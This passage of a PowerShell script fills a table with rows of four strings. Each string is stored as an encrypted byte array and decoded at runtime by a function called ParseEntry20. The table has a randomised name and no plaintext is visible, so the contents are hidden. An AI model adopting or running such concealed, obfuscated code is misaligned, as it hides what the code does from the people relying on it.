    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(37,14,188,60,134,91,74,15,179,48,158,72,41,100,154,123,134,68,58,91,157,35,157,107,62,125,237,116) @(115,60,208,73,220,28)),(ParseEntry20 @(173,21,216,90,63,149,75,228,121,8,186,118,215,116,21,138,110,202,106,102) @(248,39,142,35,91)),(ParseEntry20 @(254,149,204,171,152,170,250,212,169,231,229,201,140,148,145,166,198,239,158,151,143,150,159,206,134,162,167,180,253,180,157,168,153,151,130,222,149,222,157,131,163,175,157,166,253,238,195,153) @(164,205,164,220,250,237,195)),(ParseEntry20 @(110,130,233,235,17,119,131,121,134,136,191,65,87,149,58,160,223,182,36,88,182,87,152,211,186,37,75,150,67,167,245,173,16,96,213,101,174,214,142,4,126,134,78,189,246,162,66,68,161,117,159,194,151,5,14,209) @(15,202,187,219,114,51,236)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(158,124,37,253,191,137,104,251,45,48,202,177,148,9,130,124,19,208,172,169,28,162,15,62,197,164,243,108) @(200,78,73,136,229,206,81)),(ParseEntry20 @(84,231,51,2,31,3,61,254,91,134,39,42,34,57,31,230,72,145,44,70) @(1,213,101,123,123,110,81,148)),(ParseEntry20 @(149,139,13,67,159,214,246,163,1,119,196,162,174,132,80,95,159,162,171,169,41,6,175,251,149,139,47,67,164,232,246,167,6,78,188,160,151,169,36,76,179,160,246,167,6,6,204,233) @(207,211,101,52,253,145)),(ParseEntry20 @(82,145,254,175,29,119,182,218,211,77,87,234,200,230,75,89,189,193,201,21,105,129,254,247,31,100,161,214,211,19,125,175,206,204,71,89,189,193,202,8,126,179,237,232,48,96,233,219,210,58,102,236) @(51,217,172,159,126)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(2,182,238,219,150,198,109,183,225,215,142,213,14,220,200,156,150,217,29,227,207,196,141,246,25,197,191,147) @(84,132,130,174,204,129)),(ParseEntry20 @(232,163,192,201,182,159,166,65,231,194,212,225,139,165,132,89,244,213,223,141) @(189,145,150,176,210,242,202,43)),(ParseEntry20 @(43,25,1,90,29,178,115,246,21,2,80,30,30,162,127,237,19,114,13,87,51,199,38,246,18,56,80,89,28,143,11,252,41,59,40,90,49,196,115,243,21,6,59,94,29,179,115,181,43,22,35,70,38,173,19,187) @(113,65,105,45,127,245,74,134)),(ParseEntry20 @(48,155,209,94,180,56,62,165,207,93,179,79,53,170,182,4,179,17,7,184,217,54,133,20,48,132,251,20,155,17,31,165,225,61,238,22,53,190,214,24,154,22,16,164,206,23,231,11,28,135,194,91) @(81,211,131,110,215,124)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(142,131,174,175,215,114,225,130,161,163,207,97,130,233,136,232,215,109,145,214,143,176,204,66,149,240,255,231) @(216,177,194,218,141,53)),(ParseEntry20 @(117,165,2,97,71,4,197,77,122,196,22,73,122,62,231,85,105,211,29,37) @(32,151,84,24,35,105,169,39)),(ParseEntry20 @(242,74,22,71,0,240,191,216,118,61,9,81,214,209,157,121,28,3,6,205,202,155,92,10,105,11,142,242,203,104,63,0,58,205,199,208,95,40,9,17,212,180,238,104,29,71,95,138) @(168,18,126,48,98,183,134)),(ParseEntry20 @(95,120,243,45,41,226,242,72,124,146,121,121,194,228,11,90,197,112,28,205,199,102,98,201,124,29,222,231,114,93,239,107,40,245,164,84,84,204,72,60,235,247,127,71,236,100,122,209,211,106,125,219,81,61,155,160) @(62,48,161,29,74,166,157)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(8,217,89,213,184,198,178,208,61,146,119,244,184,217,193,209,4,179,124,199,175,235,202,148,19,170,8,157) @(94,235,53,160,226,129,139,227)),(ParseEntry20 @(40,188,207,31,25,227,245,12,39,221,219,55,36,217,215,20,52,202,208,91) @(125,142,153,102)),(ParseEntry20 @(42,180,49,149,0,55,213,41,134,33,73,223,56,181,87,27,142,106,134,24,60,223,61,146,0,30,161,47,128,58,61,155,23,164,90,7,162,29,180,4,20,222,53,151,1,7,209,100) @(112,236,89,226,98)),(ParseEntry20 @(109,176,38,31,111,188,27,89,64,203,16,28,104,129,65,69,104,149,34,68,86,160,38,71,109,175,12,85,64,149,58,89,110,171,77,69,104,149,33,89,65,146,53,88,66,187,68,87,65,188,19,88,64,143,73,18) @(12,248,116,47)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(103,156,128,142,107,233,213,200,82,215,174,175,107,246,166,201,107,246,165,156,124,196,173,140,124,239,209,198) @(49,174,236,251)),(ParseEntry20 @(147,212,35,79,143,176,170,140,47,101,169,140,159,177,59,68,162,153,139,219) @(198,230,117,54,235,221)),(ParseEntry20 @(225,226,166,153,217,253,247,158,223,249,247,221,218,237,251,133,217,137,170,148,247,136,156,132,225,226,132,153,226,195,247,154,216,192,143,148,227,192,143,151,245,214,247,133,226,136,247,154) @(187,186,206,238)),(ParseEntry20 @(3,4,7,252,75,25,238,20,0,102,168,27,57,248,87,38,49,161,126,54,219,58,30,61,173,127,37,251,46,33,27,186,74,14,184,8,40,56,153,94,16,235,35,59,24,181,24,42,204,24,25,44,128,95,96,188) @(98,76,85,204,40,93,129)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(134,172,228,12,9,151,167,187,26,42,146,202,210,33,25,226,196,208,48,52,157,244,201,14,30,145,163,181) @(208,158,136,121,83)),(ParseEntry20 @(62,28,125,174,15,67,71,189,49,125,105,134,50,121,101,165,34,106,102,234) @(107,46,43,215)),(ParseEntry20 @(152,133,58,159,191,132,251,173,54,171,228,240,163,138,103,131,191,240,166,167,30,218,143,169,152,133,24,159,132,186,251,169,49,146,156,242,154,167,19,144,147,242,251,169,49,218,236,187) @(194,221,82,232,221,195)),(ParseEntry20 @(99,120,150,218,162,66,136,116,124,247,142,242,98,158,55,90,160,135,151,109,189,90,98,172,139,150,126,157,78,93,138,156,163,85,222,104,84,169,191,183,75,141,67,71,138,185,241,113,170,70,101,241) @(2,48,196,234,193,6,231)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(221,4,165,128,138,255,178,5,170,140,146,236,209,110,131,199,138,224,194,81,132,159,145,207,198,119,244,200) @(139,54,201,245,208,184)),(ParseEntry20 @(74,58,65,45,247,164,199,117,82,68,22,194,144,252,81,122,94,16,222,244) @(31,8,23,84,147,201,171)),(ParseEntry20 @(177,179,240,76,137,172,161,75,143,168,161,8,138,188,173,80,137,216,252,65,167,217,244,75,136,146,161,79,136,145,217,65,179,145,217,76,165,218,161,78,143,172,202,72,137,173,161,8,177,188,210,80,178,179,193,6) @(235,235,152,59)),(ParseEntry20 @(143,244,88,247,109,223,216,152,240,57,163,61,255,206,219,214,110,170,88,240,237,182,238,98,166,89,227,205,162,209,68,177,108,200,142,132,216,103,146,120,214,221,175,203,71,190,62,236,250,186,253,63) @(238,188,10,199,14,155,183)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(150,106,253,32,192,135,97,162,54,227,130,12,203,13,208,242,2,201,28,253,141,50,208,34,215,129,101,172) @(192,88,145,85,154)),(ParseEntry20 @(183,222,38,122,52,145,21,32,184,191,50,82,9,171,55,56,171,168,61,62) @(226,236,112,3,80,252,121,74)),(ParseEntry20 @(64,252,159,27,110,93,157,135,8,79,35,151,150,59,57,113,198,196,8,118,86,151,147,28,110,116,233,129,14,84,87,211,185,42,52,109,234,179,58,106,126,150,155,25,111,109,153,202) @(26,164,247,108,12)),(ParseEntry20 @(144,68,34,141,70,183,158,122,60,142,65,192,149,117,69,215,65,158,167,103,42,229,119,155,144,91,8,199,105,158,191,122,18,238,28,153,149,97,37,203,104,153,176,123,62,254,21,139,188,72,23,202,105,132,204,49) @(241,12,112,189,37,243)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(92,79,3,157,174,77,68,92,139,141,72,41,53,176,190,56,39,55,161,147,71,23,46,159,185,75,64,82) @(10,125,111,232,244)),(ParseEntry20 @(130,149,141,162,179,202,183,177,141,244,153,138,142,240,149,169,158,227,138,230) @(215,167,219,219)),(ParseEntry20 @(189,254,221,45,56,160,159,197,62,25,222,149,212,13,111,140,196,134,62,32,171,148,231,48,0,191,236,194,3,35,222,210,214,32,27,157,254,207,27,35,169,202,140,49,3,213,159,193) @(231,166,181,90,90)),(ParseEntry20 @(118,54,134,27,6,151,22,97,50,231,79,86,183,0,34,20,176,70,51,184,35,79,44,188,74,50,171,3,91,19,154,93,7,128,64,125,26,185,126,19,158,19,86,9,153,82,85,164,52,109,43,173,103,18,238,68) @(23,126,212,43,101,211,121)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(93,196,177,105,138,153,1,86,104,143,159,72,138,134,114,87,81,174,148,123,157,180,121,18,70,183,224,33) @(11,246,221,28,208,222,56,101)),(ParseEntry20 @(153,57,67,58,131,161,103,127,25,180,142,90,76,20,169,190,66,81,18,218) @(204,11,21,67,231)),(ParseEntry20 @(149,118,128,25,61,55,125,191,74,171,87,108,17,19,250,69,138,93,59,10,8,253,124,130,52,7,58,51,150,87,209,26,60,10,5,254,118,146,47,39,62,117,246,90,139,92,110,8) @(207,46,232,110,95,112,68)),(ParseEntry20 @(224,53,35,156,75,179,238,11,61,159,76,196,229,4,68,198,76,154,215,22,43,244,122,159,224,42,9,214,100,154,207,11,19,255,17,157,229,16,36,218,101,157,192,10,63,255,24,128,204,57,36,153) @(129,125,113,172,40,247)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(121,212,54,183,136,104,223,105,161,171,109,178,0,154,152,29,188,2,139,181,98,140,27,181,159,110,219,103) @(47,230,90,194,210)),(ParseEntry20 @(137,31,44,144,184,64,22,131,134,126,56,184,133,122,52,155,149,105,43,212) @(220,45,122,233)),(ParseEntry20 @(48,215,179,11,88,214,103,26,235,152,69,9,240,9,95,228,185,79,94,235,18,88,221,177,38,98,219,41,51,246,226,8,89,235,31,89,215,161,61,67,222,8,83,251,184,78,104,228,61,91,182,237,30,8,164,50,8,226,157,8,96,192,99,87) @(106,143,219,124,58,145,94)),(ParseEntry20 @(85,52,98,164,151,42,181,23,120,79,84,167,144,23,239,11,80,17,102,255,174,54,136,9,85,43,72,238,184,3,148,23,86,47,9,254,144,3,143,23,121,22,113,227,186,23,234,25,122,6,97,160) @(52,124,48,148,244,110,218,97)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(151,17,28,217,36,243,165,52,162,90,50,248,36,236,214,53,155,123,57,203,51,222,221,112,140,98,77,145) @(193,35,112,172,126,180,156,7)),(ParseEntry20 @(153,153,155,178,168,198,161,161,150,248,143,154,149,252,131,185,133,239,156,246) @(204,171,205,203)),(ParseEntry20 @(174,12,142,97,58,179,109,150,114,27,205,103,135,65,109,159,54,213,114,34,184,103,168,98,1,157,109,146,117,34,181,100,190,108,25,140,25,176,47,43,151,102,160,108,59,131,105,219) @(244,84,230,22,88)),(ParseEntry20 @(60,23,151,76,62,27,170,10,17,108,161,79,57,38,240,22,57,50,147,23,7,7,151,20,60,8,189,6,17,50,139,10,63,12,252,22,57,50,144,10,16,53,132,11,16,38,245,11,19,11,136,6,17,40,248,65) @(93,95,197,124)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(55,87,172,252,167,72,177,82,6,185,203,169,85,208,43,87,154,209,180,104,197,11,36,183,196,188,50,181) @(97,101,192,137,253,15,136)),(ParseEntry20 @(249,183,242,18,200,232,200,1,246,214,230,58,245,210,234,25,229,193,245,86) @(172,133,164,107)),(ParseEntry20 @(112,229,19,170,72,250,66,173,78,254,66,238,75,234,78,182,72,142,31,167,102,142,53,169,115,212,66,169,73,199,58,239,114,199,58,237,103,251,66,168,112,229,41,181,73,250,16,224) @(42,189,123,221)),(ParseEntry20 @(252,47,117,230,157,120,31,235,43,20,178,205,88,9,168,13,67,187,168,87,42,197,53,79,183,169,68,10,209,10,105,160,156,111,73,247,3,74,131,136,113,26,220,16,105,191,206,70,62,217,42,18) @(157,103,39,214,254,60,112)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(1,136,159,241,65,142,110,137,144,253,89,157,13,226,185,182,65,145,30,221,190,238,90,190,26,251,206,185) @(87,186,243,132,27,201)),(ParseEntry20 @(118,68,204,27,133,78,26,240,56,178,97,39,195,53,175,81,63,222,51,220) @(35,118,154,98,225)),(ParseEntry20 @(175,139,47,63,247,178,234,55,44,214,204,224,38,31,160,158,177,116,44,239,185,224,9,60,204,156,234,51,43,239,180,225,31,50,212,199,157,43,113,224,145,225,1,63,244,164,238,122) @(245,211,71,72,149)),(ParseEntry20 @(56,222,77,3,142,197,129,6,21,165,123,0,137,248,219,26,61,251,73,88,183,217,188,24,56,193,103,73,161,236,160,6,59,197,38,89,137,236,187,6,20,252,94,68,163,232,222,64,23,252,120,7) @(89,150,31,51,237,129,238,112)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(0,175,129,183,12,218,212,241,53,228,175,150,12,197,167,240,12,197,164,165,27,247,172,181,27,220,208,255) @(86,157,237,194)),(ParseEntry20 @(56,66,249,235,9,29,195,248,55,35,237,195,52,39,225,224,36,52,254,175) @(109,112,175,146)),(ParseEntry20 @(169,249,160,135,145,230,241,128,151,226,241,195,146,246,253,155,145,146,172,138,191,146,134,132,170,200,241,132,144,219,137,194,171,219,137,195,190,231,241,195,146,146,134,138,151,204,133,205) @(243,161,200,240)),(ParseEntry20 @(252,14,147,239,31,3,205,179,209,117,165,236,24,62,151,175,249,43,151,180,38,31,240,173,252,17,185,165,48,42,236,179,255,21,248,181,24,42,247,179,208,44,128,168,50,46,146,245,211,44,170,167) @(157,70,193,223,124,71,162,197)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(229,173,61,35,233,216,104,101,208,230,19,2,233,199,27,100,233,199,24,49,254,245,16,33,254,222,108,107) @(179,159,81,86)),(ParseEntry20 @(48,186,1,97,236,250,17,15,210,4,90,217,206,42,43,250,30,92,217,170) @(101,136,87,24,136,151,125)),(ParseEntry20 @(150,153,146,132,12,139,248,138,151,45,245,242,155,164,91,167,163,201,151,20,128,242,180,135,55,165,248,142,144,20,141,245,162,137,47,254,143,203,202,27,150,153,168,155,13,139,170,199) @(204,193,250,243,110)),(ParseEntry20 @(126,77,3,60,32,119,214,132,83,54,53,63,39,74,140,152,123,104,7,103,25,107,235,154,126,82,41,118,15,94,247,132,125,86,104,102,39,94,236,132,82,111,16,123,12,112,137,194,82,111,4,123) @(31,5,81,12,67,51,185,242)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(129,25,238,241,141,108,187,183,180,82,192,208,141,115,200,182,141,115,203,227,154,65,195,243,154,106,191,185) @(215,43,130,132)),(ParseEntry20 @(180,176,89,83,165,121,198,139,216,92,104,144,77,253,175,240,70,110,144,41) @(225,130,15,42,193,20,170)),(ParseEntry20 @(123,202,145,141,39,102,171,137,158,6,24,161,152,173,112,74,240,202,158,63,109,161,157,138,39,79,223,143,152,29,108,229,183,188,125,86,220,189,172,35,69,160,149,143,38,86,175,196) @(33,146,249,250,69)),(ParseEntry20 @(92,79,154,51,94,67,167,117,113,52,172,48,89,126,253,105,89,106,158,104,103,95,154,107,92,80,176,121,113,106,134,117,95,84,241,105,89,106,157,117,112,109,137,116,115,68,248,123,112,67,175,116,113,112,245,62) @(61,7,200,3)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(160,199,9,51,172,178,92,117,149,140,39,18,172,173,47,116,172,173,44,33,187,159,36,49,187,180,88,123) @(246,245,101,70)),"",(ParseEntry20 @(56,99,77,214,90,13,173,129,6,120,28,146,89,29,161,154,0,8,65,219,116,120,198,155,56,99,111,214,97,51,173,133,1,65,100,219,96,48,213,136,44,87,28,202,97,120,173,133) @(98,59,37,161,56,74,148,241)),(ParseEntry20 @(90,111,243,78,88,99,206,8,119,20,197,77,95,94,148,20,95,74,247,21,97,127,243,22,90,112,217,4,119,74,239,8,89,116,152,20,95,74,244,8,118,77,224,9,118,94,145,9,118,93,244,7,119,80,156,67) @(59,39,161,126)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(46,192,195,246,227,223,65,193,204,250,251,204,34,170,229,177,227,192,49,149,226,233,248,239,53,179,146,190) @(120,242,175,131,185,152)),"",(ParseEntry20 @(12,80,75,106,73,224,111,120,71,94,18,148,55,95,22,118,73,148,50,114,111,47,121,205,12,80,105,106,114,222,111,124,64,103,106,150,14,114,98,101,101,150,111,124,64,47,26,223) @(86,8,35,29,43,167)),(ParseEntry20 @(239,45,126,20,167,196,170,244,194,86,72,23,160,249,240,232,234,8,122,79,158,216,151,234,239,50,84,94,136,237,139,244,236,54,21,78,160,237,144,244,195,15,109,83,138,211,245,245,195,33,121,17) @(142,101,44,36,196,128,197,130)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(125,98,137,181,85,248,18,99,134,185,77,235,113,8,175,242,85,231,98,55,168,170,78,200,102,17,216,253) @(43,80,229,192,15,191)),"",(ParseEntry20 @(211,165,173,150,214,230,11,249,153,134,216,135,192,101,188,150,167,210,208,219,126,187,145,181,130,205,152,70,234,135,132,155,236,219,115,254,179,244,216,193,197,117,219,142,167,167,141,146,104,222,183,174,184,236,248,15) @(137,253,197,225,180,161,50)),(ParseEntry20 @(142,11,145,77,167,120,28,153,15,240,25,247,88,10,218,41,167,16,146,87,41,183,17,171,28,147,68,9,163,46,141,11,166,111,74,133,39,174,40,178,113,25,174,52,142,4,244,75,62,187,2,246) @(239,67,195,125,196,60,115)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(174,17,68,152,8,191,26,27,142,43,186,119,114,181,24,202,121,112,164,53,181,73,105,154,31,185,30,21) @(248,35,40,237,82)),"",(ParseEntry20 @(247,13,230,86,228,234,108,254,69,197,148,102,239,118,179,198,55,189,69,252,225,102,192,85,223,196,108,250,66,252,236,100,214,91,199,215,26,216,24,241,207,59,207,28) @(173,85,142,33,134)),(ParseEntry20 @(215,89,184,161,83,242,126,156,221,3,210,34,142,232,5,220,117,135,199,91,236,73,184,249,81,225,105,144,221,93,248,103,136,194,9,220,117,135,196,70,251,123,171,230,126,229,33,146,222,100,209,107) @(182,17,234,145,48)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(0,1,99,61,242,248,111,0,108,49,234,235,12,107,69,122,242,231,31,84,66,34,233,200,27,114,50,117) @(86,51,15,72,168,191)),"",(ParseEntry20 @(161,114,133,92,39,126,9,139,78,174,18,118,88,103,206,65,143,24,33,67,124,200,78,157,73,43,116,70,153,114,160,92,11,127,8,140,100,169,125,35,93,2,151,95,142,92,120,4) @(251,42,237,43,69,57,48)),(ParseEntry20 @(150,128,86,35,155,223,152,190,72,32,156,168,147,177,49,121,156,246,161,163,94,75,170,243,150,159,124,105,180,246,185,190,102,64,193,241,147,165,81,101,181,241,182,191,74,80,200,227,186,140,99,100,180,236,202,245) @(247,200,4,19,248,155)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(23,66,236,137,4,6,73,179,159,39,3,36,218,164,20,115,42,216,181,57,12,26,193,139,19,54,77,189) @(65,112,128,252,94)),(ParseEntry20 @(190,214,195,126,143,137,195,126,162,162,215,111,178,214,230,96,166,181,168,58) @(235,228,149,7)),(ParseEntry20 @(227,133,112,9,244,50,128,173,124,61,175,70,216,138,45,21,244,70,221,167,84,76,196,31,227,133,82,9,207,12,128,169,123,4,215,70,225,167,89,7,217,35,128,169,123,76,196,0,218,236,33,72,244,71,140,177,122,19,208,1,227,140,37,67) @(185,221,24,126,150,117)),(ParseEntry20 @(37,211,60,183,39,223,1,241,8,168,10,180,32,226,91,237,32,246,56,236,30,195,60,239,37,204,22,253,8,246,32,241,38,200,87,237,32,246,59,241,9,241,47,240,10,226,94,255,10,225,63,179) @(68,155,110,135)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(241,59,112,19,41,135,110,148,106,101,36,39,154,15,237,59,70,62,58,167,26,205,72,107,43,4,253,106) @(167,9,28,102,115,192,87)),(ParseEntry20 @(13,64,221,124,55,53,36,242,76,21,26,26,210,55,32,63,63,218,56,110) @(88,114,139,5,83)),(ParseEntry20 @(111,14,145,174,56,215,12,38,157,154,99,163,84,1,204,178,56,163,81,44,181,234,20,228,108,63,192,173,57,234,116,100,161,163,27,160,120,16,192,172,0,200,103,62,154,158,49,173) @(53,86,249,217,90,144)),(ParseEntry20 @(232,208,189,180,162,47,182,255,212,220,224,242,15,160,188,242,139,233,151,0,131,209,202,135,229,150,19,163,197,245,161,242,163,56,224,227,252,130,209,183,38,179,200,239,161,237,241,17,151,205,213,218) @(137,152,239,132,193,107,217)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(101,184,198,25,21,199,156,120,80,243,232,56,21,216,239,121,105,210,227,11,2,234,228,60,126,253,151,81) @(51,138,170,108,79,128,165,75)),(ParseEntry20 @(61,192,130,222,8,14,148,204,33,180,150,207,53,81,177,210,37,163,233,154) @(104,242,212,167,108,99,194,181)),(ParseEntry20 @(254,128,130,97,143,210,243,212,188,169,47,222,244,157,145,179,136,37,137,239,134,151,150,158,79,132,172,190,199,162,171,36,181,239,139,150,150,134,47,152,241,248,226,175,139,71,208,168) @(164,216,234,22,237,149,202)),(ParseEntry20 @(65,201,193,136,46,196,211,86,205,160,220,126,228,197,21,235,247,213,27,235,230,120,211,251,217,26,248,198,108,236,221,206,47,211,133,74,229,254,237,59,205,214,97,246,221,209,125,176,242,74,230,167) @(32,129,147,184,77,128,188)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(221,89,6,146,227,8,52,184,8,19,165,237,21,85,193,89,48,191,240,40,64,225,42,29,170,206,114,48) @(139,107,106,231,185,79,13)),(ParseEntry20 @(142,221,97,252,112,14,29,162,166,113,199,124,58,121,168,136,122,212,41,94) @(219,239,55,133,20,99,75)),(ParseEntry20 @(103,121,21,77,117,61,98,73,89,98,68,9,118,45,110,82,95,18,25,64,91,73,21,77,100,72,68,78,116,0,26,13,101,91,60,8,89,75,98,76,103,121,47,82,116,61,48,4) @(61,33,125,58,23,122,91,57)),(ParseEntry20 @(241,211,102,218,109,213,178,230,215,7,142,61,245,164,165,241,80,135,88,250,135,200,201,92,139,89,233,167,220,246,122,156,108,194,228,250,255,89,191,120,220,183,209,236,123,169,62,161,144,250,206,67) @(144,155,52,234,14,145,221)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(2,165,25,45,251,117,99,247,55,238,55,12,251,106,16,246,14,207,60,63,236,88,27,179,25,224,72,101) @(84,151,117,88,161,50,90,196)),(ParseEntry20 @(71,106,102,106,246,144,139,107,17,118,81,250,164,239,97,63,125,66,175,192) @(18,88,48,19,146,253,221)),(ParseEntry20 @(207,248,254,6,21,115,166,67,241,227,175,66,22,99,170,88,247,147,242,11,59,7,251,67,247,206,219,7,21,108,210,68,219,230,174,6,57,112,201,85,241,146,250,4,20,67,162,14) @(149,160,150,113,119,52,159,51)),(ParseEntry20 @(122,10,119,189,165,183,209,109,14,22,233,245,151,199,46,40,65,224,144,152,228,67,16,77,236,145,139,196,87,47,107,251,164,160,135,113,38,72,216,176,190,212,90,53,107,206,246,139,243,95,37,82,193,177,206,131) @(27,66,37,141,198,243,190)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(185,173,245,74,181,216,160,12,140,230,219,107,181,199,211,13,181,199,208,88,162,245,216,72,162,232,164,2) @(239,159,153,63)),(ParseEntry20 @(139,92,79,119,186,3,117,100,132,61,91,95,135,57,87,124,151,42,80,51) @(222,110,25,14)),(ParseEntry20 @(151,159,240,179,114,102,244,183,252,135,41,18,172,144,173,175,114,18,169,189,212,246,66,75,151,159,210,179,73,88,244,179,251,190,81,18,149,189,217,189,95,119,244,179,251,246,66,84,174,246,161,242,114,19,248,171,250,169,86,85,151,150,165,249) @(205,199,152,196,16,33)),(ParseEntry20 @(75,242,160,115,149,13,249,156,102,137,150,112,146,48,163,128,78,215,164,40,172,17,196,130,75,237,138,57,186,36,216,156,72,233,203,41,146,36,195,156,103,208,179,52,184,48,166,146,100,192,163,119) @(42,186,242,67,246,73,150,234)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(4,133,240,125,66,204,173,97,212,229,74,76,209,204,24,133,198,80,81,236,217,56,246,235,69,111,182,169) @(82,183,156,8,24,139,148)),(ParseEntry20 @(76,97,40,67,125,62,18,80,67,0,60,107,64,4,48,72,80,23,55,7) @(25,83,126,58)),(ParseEntry20 @(110,36,252,188,101,76,134,68,24,215,242,52,106,232,1,23,246,248,99,113,243,7,50,224,146,110,50,203,87,6,213,255,95,113,254,6,50,165,242,114,81,231,102,20,247,140,108,54) @(52,124,148,203,7,11,191)),(ParseEntry20 @(22,51,156,90,196,103,86,1,55,253,14,148,71,64,66,17,170,7,241,72,99,47,41,166,11,240,91,67,59,22,128,28,197,112,0,29,31,163,63,209,110,83,54,12,129,41,151,19,116,29,46,185) @(119,123,206,106,167,35,57)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(52,164,29,77,4,132,194,81,245,8,122,10,153,163,40,164,43,96,23,164,182,8,215,6,117,41,254,198) @(98,150,113,56,94,195,251)),(ParseEntry20 @(4,194,122,6,83,60,156,70,37,100,19,161,117,40,121,35,185,104,54,10) @(81,240,44,127,55)),(ParseEntry20 @(18,166,57,148,251,72,123,56,154,18,218,170,110,21,125,149,51,208,253,117,14,123,176,37,186,240,54,54,43,132,20,148,193,117,3,122,179,7,218,227,108,5,113,136,51,171,215,117) @(72,254,81,227,153,15,66)),(ParseEntry20 @(128,250,17,226,130,246,44,164,173,129,39,225,133,203,118,184,133,223,21,185,187,234,17,186,128,229,59,168,173,223,13,164,131,225,122,184,133,223,22,164,172,216,2,170,172,241,115,171,175,200,10,231) @(225,178,67,210)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(172,65,198,243,129,100,28,123,153,10,232,210,129,123,111,122,160,43,227,225,150,73,100,63,183,4,151,187) @(250,115,170,134,219,35,37,72)),"",(ParseEntry20 @(166,27,243,204,206,32,149,168,152,0,162,136,205,48,153,179,158,112,255,193,224,85,254,178,166,27,209,204,245,30,149,172,159,57,218,193,244,29,237,161,178,47,162,208,245,85,149,172) @(252,67,155,187,172,103,172,216)),(ParseEntry20 @(62,185,207,153,60,181,242,223,19,194,249,154,59,136,168,195,59,156,203,194,5,169,207,193,62,166,229,211,19,156,211,223,61,162,164,195,59,156,200,223,18,155,220,222,18,136,173,222,18,139,200,208,19,134,160,148) @(95,241,157,169)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(166,243,132,135,117,183,248,219,145,86,178,149,178,170,101,194,155,176,187,72,189,171,169,133,98,135,252,213) @(240,193,232,242,47)),"",(ParseEntry20 @(234,93,252,15,42,214,43,19,212,70,173,75,41,198,39,8,210,54,240,2,4,162,92,23,233,108,173,12,43,235,83,81,232,127,213,72,5,215,43,22,234,93,198,16,43,214,121,94) @(176,5,148,120,72,145,18,99)),(ParseEntry20 @(26,18,193,176,39,143,20,44,223,179,32,248,31,35,166,234,32,166,45,49,201,216,22,163,26,13,235,250,8,166,53,44,241,211,125,161,31,55,198,246,9,161,58,45,221,233,116,177,53,30,222,181) @(123,90,147,128,68,203)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(43,220,249,252,171,10,145,106,30,151,215,221,171,21,226,107,39,182,220,238,188,39,233,46,48,153,168,180) @(125,238,149,137,241,77,168,89)),"",(ParseEntry20 @(118,153,217,28,168,236,21,177,213,40,243,152,77,150,132,0,168,152,72,187,253,88,132,223,117,168,136,31,169,209,109,245,233,17,139,153,98,240,136,30,144,243,126,169,210,44,161,150) @(44,193,177,107,202,171)),(ParseEntry20 @(135,116,164,23,149,81,64,255,170,15,146,20,146,108,26,227,130,81,160,76,172,77,125,225,135,107,142,93,186,120,97,255,132,111,207,77,146,120,122,255,171,86,183,80,185,86,31,185,171,86,163,80) @(230,60,246,39,246,21,47,137)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(13,171,132,36,248,120,98,170,139,40,224,107,1,193,162,99,248,103,18,254,165,59,227,72,22,238,213,108) @(91,153,232,81,162,63)),"",(ParseEntry20 @(128,10,178,143,184,21,227,136,190,17,227,203,187,5,239,147,184,97,190,130,150,97,190,136,184,60,151,142,184,10,151,143,148,20,226,143,148,22,140,158,190,96,182,141,185,37,231,197) @(218,82,218,248)),(ParseEntry20 @(152,137,229,248,242,189,174,193,132,162,157,242,211,177,164,147,165,218,158,250,163,153,229,160,240,174,185,205,132,252,183,183,213,155,168,147,165,218,157,231,180,171,246,191,223,186,241,207,133,213,158,182,251,191,172,196) @(249,193,183,200,145)))  
    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(189,123,98,43,177,14,55,109,136,48,76,10,177,17,68,108,177,17,71,57,166,35,79,41,166,48,76,13,166,46,51,99) @(235,73,14,94)),"",(ParseEntry20 @(176,124,187,50,136,99,234,53,142,103,234,118,139,115,230,46,136,23,183,63,166,22,129,47,176,124,153,50,179,93,234,49,137,94,146,63,178,94,146,60,164,72,234,46,179,22,234,49) @(234,36,211,69)),(ParseEntry20 @(111,19,32,158,128,74,52,4,226,208,106,104,22,215,214,100,63,31,248,136,84,3,32,198,130,89,35,8,226,142,64,45,16,253,218,100,63,31,251,149,67,49,51,217,174,119,107,5,227,153,91,34,62,217,222,51) @(14,91,114,174,227)))  
